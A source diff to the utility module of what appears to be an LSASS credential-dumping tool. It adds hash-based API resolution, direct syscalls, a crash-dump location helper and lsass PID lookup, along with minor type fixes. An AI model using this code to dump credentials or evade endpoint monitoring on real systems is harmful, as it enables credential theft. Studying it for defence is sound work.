@@ -1,7 +1,83 @@
 #include "utils.h"
 #include "handle.h"
+#include "dinvoke.h"
 #include "syscalls.h"
 
+#ifndef SSP
+
+BOOL print_shtinkering_crash_location(VOID)
+{
+    BOOL ret_val = FALSE;
+    DWORD bufferSize = 300;
+    LPWSTR env_var = NULL;
+    BOOL success = FALSE;
+
+    env_var = intAlloc(bufferSize);
+    if (!env_var)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+
+    success = get_env_var(L"LocalAppData", env_var, bufferSize);
+    if (!success)
+        goto cleanup;
+
+    PRINT("Done, run: dir %ls\\CrashDumps\\", env_var);
+
+    ret_val = TRUE;
+
+cleanup:
+    if (env_var)
+        intFree(env_var);
+
+    return ret_val;
+}
+
+BOOL get_env_var(
+    IN LPWSTR name,
+    OUT LPWSTR value,
+    IN DWORD size)
+{
+    BOOL ret_val = FALSE;
+    GetEnvironmentVariableW_t GetEnvironmentVariableW = NULL;
+
+    GetEnvironmentVariableW = (GetEnvironmentVariableW_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        GetEnvironmentVariableW_SW2_HASH,
+        0);
+    if (!GetEnvironmentVariableW)
+    {
+        api_not_found("GetEnvironmentVariableW");
+        goto cleanup;
+    }
+
+    size = GetEnvironmentVariableW(name, value, size);
+    if (!size)
+    {
+        DPRINT_ERR("Retrieving %ls failed", value);
+        goto cleanup;
+    }
+
+    ret_val = TRUE;
+
+cleanup:
+    return ret_val;
+}
+
+// https://github.com/kevoreilly/capemon/blob/940c76cc17c4daefbf11f6cd932a9dece472ace1/hook_sleep.c#L502
+DWORD get_tick_count(VOID)
+{
+    PVOID pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
+    ULONG32 MajorVersion = *RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);
+
+    if (MajorVersion >= 6)
+        return (DWORD)((*(ULONGLONG *)0x7ffe0320 * *(DWORD *)0x7ffe0004) >> 24);
+    else
+        return (DWORD)(((ULONGLONG)*(DWORD *)0x7ffe0000 * *(DWORD *)0x7ffe0004) >> 24);
+}
+
+#endif
 
 BOOL find_process_id_by_name(
     IN LPCSTR process_name,
@@ -127,7 +203,7 @@ VOID get_full_path(
     // add the file path
     wcsncat(full_dump_path->Buffer, wcFileName, MAX_PATH);
     // set the length fields
-    full_dump_path->Length = wcsnlen(full_dump_path->Buffer, MAX_PATH);
+    full_dump_path->Length = (USHORT)wcsnlen(full_dump_path->Buffer, MAX_PATH);
     full_dump_path->Length *= 2;
     full_dump_path->MaximumLength = full_dump_path->Length + 2;
 }
@@ -261,6 +337,10 @@ BOOL delete_file(
     wchar_t wcFilePath[MAX_PATH] = { 0 };
     UNICODE_STRING UnicodeFilePath = { 0 };
     UnicodeFilePath.Buffer = wcFilePath;
+
+    if (!filepath)
+        return TRUE;
+
     get_full_path(&UnicodeFilePath, filepath);
 
     // init the object attributes
@@ -293,6 +373,10 @@ BOOL file_exists(
     wchar_t wcFilePath[MAX_PATH] = { 0 };
     UNICODE_STRING UnicodeFilePath = { 0 };
     UnicodeFilePath.Buffer = wcFilePath;
+
+    if (!filepath)
+        return FALSE;
+
     get_full_path(&UnicodeFilePath, filepath);
 
     // init the object attributes
@@ -428,7 +512,7 @@ VOID free_linked_list(
 
     for (int i = number_of_nodes - 1; i >= 0; i--)
     {
-        Plinked_list node = (Plinked_list)head;
+        node = (Plinked_list)head;
 
         int jumps = i;
         while (jumps--)
@@ -468,6 +552,8 @@ VOID encrypt_dump(
     IN PVOID base_address,
     IN SIZE_T region_size)
 {
+    UNUSED(base_address);
+    UNUSED(region_size);
     //BYTE key = 0x2e;
     //PBYTE addr = NULL;
 
@@ -748,7 +834,28 @@ DWORD get_pid(
         return 0;
     }
 
-    return basic_info.UniqueProcessId;
+    return (DWORD)basic_info.UniqueProcessId;
+}
+
+DWORD get_tid(
+    IN HANDLE hThread)
+{
+    THREAD_BASIC_INFORMATION basic_info = { 0 };
+    THREADINFOCLASS ProcessInformationClass = 0;
+
+    NTSTATUS status = _NtQueryInformationThread(
+        hThread,
+        ProcessInformationClass,
+        &basic_info,
+        sizeof(THREAD_BASIC_INFORMATION),
+        NULL);
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtQueryInformationThread", status);
+        return 0;
+    }
+
+    return (DWORD)(ULONG_PTR)basic_info.ClientId.UniqueThread;
 }
 
 #if defined(NANO) && !defined(SSP)
@@ -793,7 +900,8 @@ BOOL kill_process(
         hProcess = get_process_handle(
             pid,
             PROCESS_TERMINATE,
-            FALSE);
+            FALSE,
+            0);
         if (!hProcess)
         {
             DPRINT_ERR("Failed to kill process with PID: %ld", pid);
@@ -832,7 +940,7 @@ BOOL kill_process(
 DWORD get_lsass_pid(VOID)
 {
     DWORD lsass_pid;
-    HANDLE hProcess = find_lsass(PROCESS_QUERY_INFORMATION);
+    HANDLE hProcess = find_lsass(PROCESS_QUERY_LIMITED_INFORMATION, 0);
     if (!hProcess)
         return 0;
     lsass_pid = get_pid(hProcess);
